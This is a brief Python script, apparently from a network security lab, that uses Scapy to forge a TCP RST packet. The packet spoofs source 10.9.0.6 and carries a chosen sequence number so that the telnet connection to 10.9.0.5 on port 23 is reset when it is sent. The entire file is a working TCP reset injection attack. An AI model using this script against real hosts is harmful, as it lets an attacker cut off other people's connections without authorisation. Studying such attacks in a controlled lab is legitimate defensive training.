#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=41690, dport=23, flags="R", seq=2445437517)

pkt = ip / tcp
ls(pkt)

send(pkt, verbose=0)
